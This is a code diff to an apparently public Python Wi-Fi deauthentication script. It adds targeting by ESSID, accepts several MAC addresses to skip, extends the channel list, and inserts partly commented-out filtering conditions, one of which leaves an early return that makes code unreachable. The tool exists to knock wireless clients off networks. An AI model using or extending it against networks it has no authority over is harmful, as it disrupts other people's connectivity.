@@ -30,7 +30,7 @@ def parse_args():
 	#Create the arguments
     parser = argparse.ArgumentParser()
 
-    parser.add_argument("-s", "--skip", help="Skip deauthing this MAC address. Example: -s 00:11:BB:33:44:AA")
+    parser.add_argument("-s", "--skip", nargs='*', help="Skip deauthing this MAC address. Example: -s 00:11:BB:33:44:AA")
     parser.add_argument("-i", "--interface", help="Choose monitor mode interface. By default script will find the most powerful interface and starts monitor mode on it. Example: -i mon5")
     parser.add_argument("-c", "--channel", help="Listen on and deauth only clients on the specified channel. Example: -c 6")
     parser.add_argument("-m", "--maximum", help="Choose the maximum number of clients to deauth. List of clients will be emptied and repopulated after hitting the limit. Example: -m 5")
@@ -39,6 +39,7 @@ def parse_args():
     parser.add_argument("-p", "--packets", help="Choose the number of packets to send in each deauth burst. Default value is 1; 1 packet to the client and 1 packet to the AP. Send 2 deauth packets to the client and 2 deauth packets to the AP: -p 2")
     parser.add_argument("-d", "--directedonly", help="Skip the deauthentication packets to the broadcast address of the access points and only send them to client/AP pairs", action='store_true')
     parser.add_argument("-a", "--accesspoint", help="Enter the MAC address of a specific access point to target")
+    parser.add_argument("-e", "--essid", help="Enter the ESSID of a specific access point to target")
     parser.add_argument("--world", help="N. American standard is 11 channels but the rest of the world it's 13 so this options enables the scanning of 13 channels", action="store_true")
 
     return parser.parse_args()
@@ -260,9 +261,10 @@ def noise_filter(skip, addr1, addr2):
     # Broadcast, broadcast, IPv6mcast, spanning tree, spanning tree, multicast, broadcast
     ignore = ['ff:ff:ff:ff:ff:ff', '00:00:00:00:00:00', '33:33:00:', '33:33:ff:', '01:80:c2:00:00:00', '01:00:5e:', mon_MAC]
     if skip:
-        ignore.append(skip)
+        for i in skip:
+            ignore.append(i.lower())
     for i in ignore:
-        if i in addr1 or i in addr2:
+        if i in addr1.lower() or i in addr2.lower():
             return True
 
 def cb(pkt):
@@ -316,7 +318,7 @@ def APs_add(clients_APs, APs, pkt, chan_arg, world_arg):
         # Thanks to airoscapy for below
         ap_channel = str(ord(pkt[Dot11Elt:3].info))
         if args.world == 'True':
-            chans = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13']
+            chans = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14']
         else:
             chans = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11']
         if ap_channel not in chans:
@@ -325,7 +327,12 @@ def APs_add(clients_APs, APs, pkt, chan_arg, world_arg):
         if chan_arg:
             if ap_channel != chan_arg:
                 return
-
+#### custom condition APs:
+#        if not ssid:
+#            return
+#        if  ssid.find( args.essid ) == -1:
+#                return
+#### custom condition end
     except Exception as e:
         return
 
@@ -343,7 +350,7 @@ def clients_APs_add(clients_APs, addr1, addr2):
     if len(clients_APs) == 0:
         if len(APs) == 0:
             with lock:
-                return clients_APs.append([addr1, addr2, monchannel])
+                return clients_APs_append( addr1, addr2, monchannel )
         else:
             AP_check(addr1, addr2)
 
@@ -357,11 +364,26 @@ def clients_APs_add(clients_APs, addr1, addr2):
             return AP_check(addr1, addr2)
         else:
             with lock:
-                return clients_APs.append([addr1, addr2, monchannel])
+                return clients_APs_append( addr1, addr2, monchannel )
+
+def clients_APs_append( addr1, addr2, monchannel ):
+#### custom condition for clients_APs
+#### APs doesn't exist
+    # ignore if no APs
+    return
+#### custom condition for clients_APs end
+    return clients_APs.append([addr1, addr2, monchannel])
 
 def AP_check(addr1, addr2):
     for ap in APs:
         if ap[0].lower() in addr1.lower() or ap[0].lower() in addr2.lower():
+#### custom condition for client_APs
+#### check ESSID from APs
+            if args.essid:
+                ssid = ap[2]
+                if ssid not in args.essid:
+                    return
+#### custom condition for client_APs end
             with lock:
                 return clients_APs.append([addr1, addr2, ap[1], ap[2]])
 
